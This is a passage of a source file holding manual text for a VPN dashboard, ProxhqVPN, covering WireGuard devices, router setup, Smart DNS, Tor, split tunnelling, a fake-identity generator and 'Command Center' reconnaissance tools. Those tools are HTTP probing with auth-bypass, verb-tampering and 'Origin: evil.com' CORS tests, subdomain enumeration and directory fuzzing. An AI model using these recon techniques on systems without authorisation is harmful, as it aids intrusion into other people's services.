For V2Ray and obfs4, a companion process must run alongside WireGuard.
The config page provides the full startup command for each OS.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. DPI TEST GUIDE

Use the built-in DPI test to check whether your connection is being
inspected. The test sends probe packets and analyzes response patterns
to detect common DPI appliances (Cisco, Juniper, Huawei, Palo Alto).

API: GET /api/obfuscation/methods · POST /api/obfuscation/generate-config

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "device-manager-manual",
    title: "Device Manager",
    subtitle: "WireGuard Device Registry & Per-Device Config",
    tier: "both",
    pages: 4,
    icon: Cpu,
    version: "1.0",
    iconColor: "text-cyan-400",
    content: `DEVICE MANAGER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The Device Manager is ProxhqVPN's central registry for all WireGuard
client devices. Each device gets a unique IP allocation (10.8.0.x/24),
a dedicated WireGuard keypair, and a downloadable .conf file.

Navigate to: Dashboard → My Devices (/devices)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. ADDING A DEVICE

  1. Click "Add Device"
  2. Enter a device name (e.g. "MacBook Pro", "iPhone 15")
  3. Select a node (LA-63, London-62, Chicago-61, Tokyo-64)
  4. The system auto-generates:
       • WireGuard keypair (private key generated client-side)
       • IP allocation from 10.8.0.0/24 pool
       • Full WireGuard .conf file
  5. Download the .conf or scan the QR code

Private keys are generated in your browser and NEVER sent to the server.
The server stores only the device's public key.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. QR CODE IMPORT

Mobile devices can import the WireGuard config by scanning the QR code:
  iOS/Android: Open WireGuard app → "+" → "Create from QR Code"
  Scan the QR displayed in Device Manager

The QR code encodes the full WireGuard configuration including
AllowedIPs, DNS, Endpoint, and PrivateKey.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. REMOVING A DEVICE

Removing a device from the registry revokes its public key from the
WireGuard server peer list. The removed device can no longer connect
even if it still has the .conf file.

  1. Find the device in the list
  2. Click the trash icon
  3. Confirm deletion

Key revocation propagates to the WireGuard node within 30 seconds
via the Firewall Sync daemon.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. IP ALLOCATION

Devices are assigned IPs from the 10.8.0.0/24 range:
  10.8.0.1   — VPN gateway (WireGuard server)
  10.8.0.2   — first device
  10.8.0.254 — last device (max 253 devices per node)

IP assignments are persistent — the same device always gets the
same internal IP even after reconnecting.

API: GET /api/devices · POST /api/devices · DELETE /api/devices/:id

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "router-setup-manual",
    title: "Router Setup Guide",
    subtitle: "OpenWRT, DD-WRT, pfSense, GL.iNet, Ubiquiti & More",
    tier: "both",
    pages: 7,
    icon: Settings,
    version: "1.0",
    iconColor: "text-orange-400",
    content: `ROUTER SETUP GUIDE — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Installing ProxhqVPN at the router level protects every device on your
network automatically — TVs, game consoles, smart home devices, guests
— without installing any software on individual devices.

Navigate to: Dashboard → Router Setup (/router-config)

Supported firmware:
  • OpenWRT (most common, open source)
  • DD-WRT (wide hardware support)
  • Asus Merlin (ASUS routers)
  • pfSense / OPNsense (enterprise/home lab)
  • GL.iNet (travel routers, WireGuard native)
  • Ubiquiti UniFi / EdgeOS

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. GENERATING CONFIG

The Router Config Generator produces firmware-specific commands:
  1. Go to /router-config
  2. Select your firmware
  3. Select a ProxhqVPN node
  4. Click "Generate"
  5. Copy the commands or download the .conf file

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. OPENWRT SETUP (RECOMMENDED)

Prerequisites: OpenWRT 22.03+ with wireguard-tools package

  opkg update && opkg install wireguard-tools
  # Paste generated wg0.conf to /etc/wireguard/wg0.conf
  wg-quick up wg0
  # Make permanent:
  /etc/init.d/wg-quick enable
  /etc/init.d/wg-quick start

  Set DNS: Network → Interfaces → LAN → DHCP → DNS → 10.8.0.1
  Set firewall: Zone WG → allow forward from LAN to WG

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. GL.iNet SETUP (SIMPLEST)

GL.iNet routers have native WireGuard support in the admin panel:
  1. Admin Panel → VPN → WireGuard Client → Add Profile
  2. Paste the generated .conf content
  3. Enable the profile
  4. All connected devices are now protected

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. PFSENSE/OPNSENSE SETUP

  1. System → Package Manager → Install "WireGuard"
  2. VPN → WireGuard → Tunnels → Add Tunnel
  3. Paste PrivateKey, set Interface Address to 10.8.0.X/24
  4. Add Peer: paste ProxhqVPN server public key + endpoint
  5. Firewall → Rules → allow traffic from LAN to WireGuard interface
  6. System → Routing → Set WireGuard as gateway for LAN

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. SPLIT ROUTING ON ROUTER

To route only specific subnets through ProxhqVPN:
  AllowedIPs = 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
  (removes 0.0.0.0/0 so only private-range traffic uses the VPN)

For full tunnel (all traffic):
  AllowedIPs = 0.0.0.0/0, ::/0

API: GET /api/router-config/generate?firmware=openwrt&nodeId=63

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "smart-dns-manual",
    title: "Smart DNS",
    subtitle: "DNS-Only Routing for TVs, Consoles & Streaming Devices",
    tier: "both",
    pages: 4,
    icon: Zap,
    version: "1.0",
    iconColor: "text-green-400",
    content: `SMART DNS — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Smart DNS routes only DNS queries (and a small set of geo-relevant
HTTP requests) through ProxhqVPN, while all other traffic goes
directly to the internet. This provides geo-unblocking without the
overhead of a full VPN tunnel — ideal for devices that cannot run
WireGuard natively.

Navigate to: Dashboard → Smart DNS (/smart-dns)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. COMPATIBLE DEVICES

Smart DNS works on any device that lets you set a custom DNS server:
  • Samsung Smart TV (Tizen)
  • LG Smart TV (webOS)
  • Apple TV (tvOS)
  • Roku
  • PlayStation 4 / 5
  • Xbox One / Series X|S
  • Nintendo Switch
  • Amazon Fire TV / Stick
  • Android TV / Google TV
  • iOS and Android (manual DNS)
  • Windows and macOS

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. SETUP BY PLATFORM

Samsung TV:
  Settings → General → Network → Network Status → IP Settings
  → DNS Setting: Manual → enter ProxhqVPN Smart DNS IP

LG TV:
  Settings → All Settings → Network → Wi-Fi Connection
  → Advanced Wi-Fi Settings → DNS Server: Manual → enter IP

PlayStation:
  Settings → Network → Setup → Custom → DNS Settings
  → Primary DNS: ProxhqVPN IP · Secondary DNS: 1.1.1.1

Apple TV:
  Settings → Network → Wi-Fi → Configure DNS → Manual
  → Add ProxhqVPN Smart DNS IP

  (See /smart-dns for the current Smart DNS server IP address)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. DNS REACHABILITY TEST

The Smart DNS page includes a live reachability test that confirms
your device can reach the ProxhqVPN Smart DNS server. Run this test
after configuring DNS on your device.

Important: Smart DNS does NOT encrypt your traffic. It only
re-routes geo-sensitive DNS lookups. For full privacy, use
WireGuard instead of Smart DNS.

API: GET /api/smart-dns/server-ip · GET /api/smart-dns/instructions?platform=samsung · GET /api/smart-dns/test

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "vpngate-manual",
    title: "VPN Gate Integration",
    subtitle: "6,000+ Free Community VPN Nodes Worldwide",
    tier: "both",
    pages: 4,
    icon: Globe,
    version: "1.0",
    iconColor: "text-green-400",
    content: `VPN GATE INTEGRATION — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

VPN Gate is an academic public VPN relay project operated by the
University of Tsukuba (Japan). It provides 6,000+ free community-run
relay servers in 100+ countries. ProxhqVPN integrates directly with
the VPN Gate API so you can browse, filter, and connect to these
relays from within your dashboard.

Navigate to: Dashboard → Network → VPN Gate (/vpngate)

Note: VPN Gate servers are third-party community relays, NOT
ProxhqVPN servers. Use for geographic diversity only. Do not
transmit sensitive credentials through VPN Gate nodes.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. BROWSING SERVERS

The server list updates every 15 minutes from the VPN Gate API.
Filter by:
  • Country
  • Protocol (L2TP, OpenVPN, SoftEther)
  • Ping (ms)
  • Uptime score
  • Total sessions served

Each server shows: operator, country, IP, ping, uptime, session count,
and total traffic relayed (transparency metric).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. CONNECTING

  1. Browse the server list
  2. Click a server → "Connect"
  3. ProxhqVPN downloads the OpenVPN config for that relay
  4. Import the config into your OpenVPN client
     (OpenVPN Connect iOS/Android, Tunnelblick macOS, OpenVPN GUI Windows)

ProxhqVPN's "Veil" selector automatically picks the lowest-latency
relay matching your country filter.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. SECURITY CONSIDERATIONS

VPN Gate relay operators are volunteers. While the University of Tsukuba
provides the framework, individual relay servers are not audited.
  ✓ Good for: geo-unblocking content in specific countries
  ✓ Good for: adding a hop between you and your destination
  ✗ Not for: sensitive communications, banking, credentials

For maximum privacy, chain a VPN Gate relay with ProxhqVPN
(VPN Coexistence → Double-Hop mode).

API: GET /api/vpngate/servers · POST /api/vpngate/connect · GET /api/vpngate/status

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Network & Connectivity ─────────────────────────────────────────────────
  {
    id: "split-tunnel-manual",
    title: "Split Tunneling",
    subtitle: "Per-IP, CIDR, Port & App Routing Rules",
    tier: "both",
    pages: 5,
    icon: Network,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `SPLIT TUNNELING — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Split tunneling lets you choose which traffic uses the VPN tunnel and
which traffic goes directly to the internet. This gives you the
privacy benefits of ProxhqVPN for sensitive apps while keeping
local network access and maximum speed for other apps.

Navigate to: Dashboard → Network → Split Tunneling (/split-tunnel)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. RULE TYPES

IP-Based Rules:
  Route a specific IP through or around the VPN:
  e.g. 192.168.1.1/32 → direct (your NAS stays on local network)

CIDR-Based Rules:
  Route entire subnets:
  e.g. 10.0.0.0/8 → direct (all private addresses stay local)

Port-Based Rules:
  Route specific TCP/UDP ports:
  e.g. TCP:8080 → VPN (only development traffic goes through tunnel)

App-Based Rules:
  Route traffic from specific applications:
  e.g. zoom.exe → direct (Zoom uses direct; everything else uses VPN)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. ADDING RULES

  1. Split Tunneling → Add Rule
  2. Select rule type: IP / CIDR / Port / App
  3. Enter the target value
  4. Select action: VPN (route through tunnel) or Direct (bypass)
  5. Click Save

Rules are evaluated top-to-bottom. Drag to reorder.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. SCRIPT GENERATOR

ProxhqVPN generates OS-specific routing scripts from your rules:
  Linux: ip route / iptables rules
  Windows: route ADD commands + PowerShell policy script

  1. Configure your rules
  2. Click "Generate Script" and select OS
  3. Run the script on your device as root/administrator

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. COMMON USE CASES

  • Route only browser traffic through VPN; keep gaming direct
  • Keep local printer/NAS on direct; route all internet through VPN
  • Route corporate intranet traffic direct; all other traffic through VPN
  • Route specific streaming services direct for better speed

API: GET /api/split-tunnel/rules · POST /api/split-tunnel/rules · GET /api/split-tunnel/script-generate

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "proxy-tor-manual",
    title: "Proxy & Tor Configuration",
    subtitle: "SOCKS5, Port Knocking & Multi-Hop Routing",
    tier: "both",
    pages: 6,
    icon: Globe,
    version: "1.0",
    iconColor: "text-green-400",
    content: `PROXY & TOR CONFIGURATION — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

ProxhqVPN integrates multiple proxy and anonymity routing options:
  • SOCKS5 proxy (built into each node)
  • Tor integration (VPN over Tor and Tor over VPN)
  • Port knocking (stealth firewall bypass)
  • Multi-hop routing (chain multiple nodes)

Navigate to: Dashboard → Network → Proxy & Tor (/proxy)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. SOCKS5 PROXY

Each ProxhqVPN node exposes a SOCKS5 proxy server:
  Host: <node-ip>
  Port: 1080
  Auth: your ProxhqVPN credentials

Configure in your application:
  Chrome/Firefox: Settings → Proxy → SOCKS5 Host: <node-ip> Port: 1080
  Terminal: export ALL_PROXY=socks5://user:pass@<node-ip>:1080
  Python: requests library → proxies={'https': 'socks5h://...'}
  curl: curl --socks5 <node-ip>:1080 https://example.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. TOR INTEGRATION

Mode 1 — VPN over Tor (VPN inside Tor):
  Traffic → Tor Network → ProxhqVPN Node → Internet
  Benefit: Tor entry guard sees only your traffic to ProxhqVPN (hidden)
  Use case: access .onion sites with VPN privacy + Tor anonymity

Mode 2 — Tor over VPN (Tor inside VPN):
  Traffic → ProxhqVPN Node → Tor Network → Internet
  Benefit: ISP cannot see you're using Tor; ProxhqVPN node masks Tor usage
  Use case: hide Tor usage from ISP/network administrator

Setup:
  1. Install Tor Browser or the Tor daemon
  2. Configure your WireGuard client to connect to ProxhqVPN
  3. Select routing mode from the Proxy page
  4. The Proxy page shows the full proxychains config

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. PORT KNOCKING

Port knocking allows you to open ports on the server firewall by
sending a predefined sequence of packets to closed ports. This
keeps the WireGuard port invisible until you "knock":

Default sequence: TCP 7000 → TCP 8000 → TCP 9000 → port 51820 opens (30s)

  Linux: knock <node-ip> 7000 8000 9000
  Windows: ProxhqVPN desktop app handles knocking automatically
  Manual: nmap -p 7000 <ip>; nmap -p 8000 <ip>; nmap -p 9000 <ip>

API: GET /api/proxy/config · GET /api/proxy/tor-status · POST /api/proxy/knock

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "onion-browser-manual",
    title: "Onion Browser",
    subtitle: "Proxied Browser with Tor, SOCKS4/5 & Custom Proxy Support",
    tier: "both",
    pages: 4,
    icon: Globe,
    version: "1.0",
    iconColor: "text-green-400",
    content: `ONION BROWSER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The Onion Browser is a proxied web browser built directly into
the ProxhqVPN dashboard. It routes all browsing through configurable
proxy chains — without needing to install any external browser.

Navigate to: Dashboard → Network → Onion Browser (/onion-browser)
Tier: VPN Basic and above

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. PROXY MODES

Direct:
  No proxy — standard browsing via the ProxhqVPN tunnel

ProxhqVPN Onion:
  Traffic routed through the nearest ProxhqVPN node's SOCKS5 proxy
  Fastest option while inside the dashboard

Tor:
  Traffic routed through the Tor network (3-hop onion routing)
  Accesses .onion sites; highest anonymity, highest latency

Double-Hop:
  Traffic goes VPN Node 1 → VPN Node 2 → destination
  Two layers of encryption; destination sees Node 2's IP

Custom SOCKS4/5 or HTTP:
  Specify any proxy server address and port
  Supports username/password authentication

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. NAVIGATING

  • Enter a URL in the address bar (supports http, https, .onion)
  • The browser renders pages through the server-side proxy
  • JavaScript is restricted by default for security
  • Downloads are not supported in the embedded browser

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. SECURITY NOTES

  • Cookies and history are NOT persisted between sessions
  • No tracking pixels or fingerprinting scripts (JS restricted)
  • Each page load creates a fresh proxy connection
  • For maximum anonymity: use Tor mode + disable JavaScript

API: POST /api/proxy-browser/browse · GET /api/proxy-browser/proxy-status

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "meshnet-manual",
    title: "Meshnet P2P",
    subtitle: "Direct Encrypted Device-to-Device Routing",
    tier: "both",
    pages: 4,
    icon: Network,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `MESHNET P2P — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Meshnet creates a direct encrypted P2P tunnel between your own devices
(or with trusted peers) using WireGuard, without routing traffic
through a central server. Ideal for remote desktop, LAN gaming,
file sharing, and team collaboration.

Navigate to: Dashboard → Network → Meshnet P2P (/meshnet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. HOW IT WORKS

All devices in your Meshnet are assigned IPs from the 100.64.0.0/10
(CGNAT) range — a range never used on the public internet.

  Device A (100.64.0.1) ←→ Direct WireGuard P2P ←→ Device B (100.64.0.2)

Each device generates its own WireGuard keypair. Peers exchange
public keys through the ProxhqVPN coordination server (no traffic
goes through the server — only key exchange).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. ADDING PEERS

  1. Meshnet → Add Device to Mesh
  2. Generate a Meshnet invite link
  3. Share with the other device's owner
  4. They accept → WireGuard peer exchange happens automatically
  5. Both devices can now reach each other on their 100.64.x.x addresses

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. USE CASES

  Remote desktop: RDP/VNC over Meshnet IP (100.64.0.x)
  File server: SMB share on Meshnet IP — accessible from anywhere
  LAN gaming: game LAN games over internet using Meshnet
  Secure team access: give contractors Meshnet access to internal tools
  SSH: ssh user@100.64.0.x (no exposed ports, no public IP needed)

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Advanced Privacy Suite ────────────────────────────────────────────────
  {
    id: "alt-id-manual",
    title: "Alternative Identity",
    subtitle: "Fake Identity Generator for Account Registration",
    tier: "both",
    pages: 3,
    icon: Eye,
    version: "1.0",
    iconColor: "text-violet-400",
    content: `ALTERNATIVE IDENTITY — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Alternative Identity generates realistic but entirely synthetic personal
identities for use when registering with services that demand personal
details — protecting your real identity from data breaches and leaks.

Navigate to: Dashboard → Privacy Suite → Alternative Identity (/alt-id)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. GENERATED FIELDS

Each identity includes:
  • Full name (country-appropriate)
  • Date of birth (configurable age range)
  • Address (real city/zip format, fake street)
  • Phone number (valid prefix, fake subscriber)
  • Email suggestions (pattern-matched to name)
  • Username suggestions
  • Password suggestion (high-entropy)
  • Security question answers

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. USING ALT-IDS SAFELY

  • Track which alt-id you use per service (use a password manager)
  • Use a separate email alias per service (ProtonMail + aliases)
  • Combine with IP Rotator to prevent cross-service tracking
  • Never use alt-id for services requiring legal identity verification

Legal note: Alternative Identity is for privacy protection. Do not
use to misrepresent yourself in legal or financial contexts.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "ip-rotator-manual",
    title: "IP Rotator",
    subtitle: "Automatic IP Address Rotation on Schedule",
    tier: "both",
    pages: 3,
    icon: Settings,
    version: "1.0",
    iconColor: "text-orange-400",
    content: `IP ROTATOR — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

IP Rotator automatically switches your exit IP at configurable
intervals. This prevents websites, ad networks, and trackers from
building a persistent profile tied to a single VPN IP address.

Navigate to: Dashboard → Privacy Suite → IP Rotator (/ip-rotator)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. ROTATION MODES

Node Rotation:
  Switches between ProxhqVPN nodes (LA → London → Chicago → Tokyo)
  on a schedule. Your IP changes to a different country's node.

IP Rotation within Node:
  ProxhqVPN nodes are configured with a pool of exit IPs. Rotation
  picks a different IP from the pool without changing the node.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. ROTATION SCHEDULE

Options:
  • Every 5 minutes
  • Every 15 minutes
  • Every 30 minutes
  • Every hour
  • On every new browser session
  • Manual (click to rotate)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. NOTES

IP rotation causes brief reconnection events (typically 1-2 seconds).
Keep-alive connections (streaming, downloads) may be interrupted.
Combine with DAITA to prevent traffic analysis during rotation.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "data-broker-manual",
    title: "Data Broker Removal",
    subtitle: "Automated Opt-Out Requests to People-Search Sites",
    tier: "both",
    pages: 4,
    icon: Search,
    version: "1.0",
    iconColor: "text-yellow-400",
    content: `DATA BROKER REMOVAL — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Data brokers are companies that collect, aggregate, and sell your
personal information — address, phone number, relatives, income,
purchase history — without your consent. ProxhqVPN's Data Broker
Removal tool sends opt-out requests to 180+ known brokers.

Navigate to: Dashboard → Privacy Suite → Data Broker Removal (/data-broker)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. HOW IT WORKS

  1. Enter the information to search for (name, city, approximate age)
  2. The tool queries the 180 broker APIs and public search pages
  3. Matches are identified and shown (name, found-at URL, data types)
  4. For each match: click "Send Opt-Out" or "Send All Opt-Outs"
  5. Opt-out emails and form submissions are sent automatically

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. COVERED BROKERS (SAMPLE)

  Spokeo · Whitepages · BeenVerified · Intelius · PeopleFinder
  Radaris · MyLife · PeopleSmart · USSearch · ZabaSearch
  TruthFinder · Instant Checkmate · CheckPeople · PublicRecordsNow
  …and 166+ more

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. EXPECTATIONS

  • Opt-outs take 2–30 days to process depending on the broker
  • Some brokers re-add data from public records (re-scrape every 3 months)
  • Run the scan quarterly to catch re-appearances
  • Not all brokers honor opt-outs (legal in some jurisdictions only)

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Command Center — Recon Tools ──────────────────────────────────────────
  {
    id: "http-probe-manual",
    title: "HTTP Probe",
    subtitle: "Manual HTTP Request Builder & Inspector",
    tier: "pro",
    pages: 4,
    icon: Terminal,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `HTTP PROBE — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

HTTP Probe is a full-featured HTTP request builder and inspector.
Craft any HTTP request — any method, custom headers, body, cookies —
and inspect the complete response including headers, status code,
redirect chain, TLS info, and timing.

Navigate to: Command Center → HTTP Probe (/http-probe)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. REQUEST BUILDER

  Method: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD, TRACE
  URL: any http/https endpoint
  Headers: add/remove any header (Authorization, Content-Type, etc.)
  Body: Raw / JSON / Form URL-encoded / Multipart / Binary
  Auth: None / Basic / Bearer / Digest / API Key
  Proxy: route through ProxhqVPN tunnel or custom SOCKS5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. RESPONSE INSPECTOR

  Status code + reason phrase
  Response headers (full list, copyable)
  Response body (formatted JSON/HTML/XML, or raw)
  Redirect chain (shows each hop)
  TLS certificate info (subject, issuer, expiry, SANs)
  Timing breakdown (DNS, TCP, TLS, TTFB, total)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. SECURITY TESTING USES

  Test API authentication bypass (remove/modify Authorization header)
  Test for missing security headers (check response for HSTS, CSP, etc.)
  Test HTTP verb tampering (send DELETE to a GET-only endpoint)
  Test for CORS misconfiguration (add Origin: evil.com header)
  Inspect cookies for Secure/HttpOnly/SameSite flags

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "subdomain-scout-manual",
    title: "Subdomain Scout",
    subtitle: "9-Source Passive Subdomain Enumeration",
    tier: "pro",
    pages: 5,
    icon: Search,
    version: "1.0",
    iconColor: "text-yellow-400",
    content: `SUBDOMAIN SCOUT — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Subdomain Scout performs passive OSINT enumeration of subdomains from
9 independent sources simultaneously. Passive scanning never touches
the target server — all data comes from public record archives.

Navigate to: Command Center → Subdomain Scout (/subdomain-scan)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. DATA SOURCES (9)

  crt.sh             — Certificate Transparency logs
  AlienVault OTX     — Open Threat Exchange
  HackerTarget       — DNS lookup API
  URLScan.io         — Browser scan archive
  Wayback Machine    — CDX API historical crawl data
  AnubisDB (jldc.me) — passive DNS database
  RapidDNS           — rapid DNS record database
  ThreatCrowd        — threat intelligence passive DNS
  BufferOver         — tls.bufferover.run certificate data

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. RUNNING A SCAN

  1. Enter target domain (e.g. example.com — no http://)
  2. Click "Enumerate"
  3. Results stream in as each source responds (~10-30 seconds total)

Results include:
  • Subdomain hostname
  • Sources that found it (per-source breakdown)
  • uniqueSources count (higher = more trustworthy result)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. INTERPRETING RESULTS

  High uniqueSources (5+): subdomain is well-indexed and likely live
  Low uniqueSources (1): may be historical; verify with DNS lookup
  dev.*, staging.*: likely interesting internal environments
  admin.*, vpn.*, webmail.*: high-value targets

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. EXPORT

Results are exportable as JSON or CSV for use in other tools.
Feed into Directory Fuzzer or Ghost Chain for continued recon.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "dir-fuzzer-manual",
    title: "Directory Fuzzer",
    subtitle: "Recursive Directory & File Discovery",
    tier: "pro",
    pages: 5,
    icon: Search,
    version: "1.0",
    iconColor: "text-yellow-400",
    content: `DIRECTORY FUZZER — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Directory Fuzzer discovers hidden paths, files, and directories on
web servers by trying a large wordlist of common names. Supports
recursive scanning up to depth 3, response-size filtering, and
custom wordlists.

Navigate to: Command Center → Directory Fuzzer (/dir-fuzzer)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. CONFIGURATION

Target URL: Full URL including protocol (https://example.com)
Wordlist: Built-in lists (small: 1k / medium: 10k / large: 50k) or custom
Extensions: Append extensions to each word (php,asp,html,js,txt,bak)
Threads: Concurrent requests (1–50; respect target limits)
Timeout: Per-request timeout in milliseconds

Recursive Mode:
  When enabled, the fuzzer re-scans each discovered 2xx/3xx path
  with a smaller wordlist (50 words) up to depth 3.
  e.g. /admin/ found → fuzz /admin/login, /admin/users, etc.

Response Size Filter:
  Enter exact byte counts to exclude from results.
  Common use: filter out the site's 404 page size to remove false positives.
  Get the 404 size first: curl -so /dev/null -w "%{size_download}" URL/notfound

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. READING RESULTS

  200 OK     — path exists and is accessible
  301/302    — redirects to another path (follow the redirect)
  401/403    — path exists but is protected (authentication required)
  500        — server error — may indicate injection opportunity

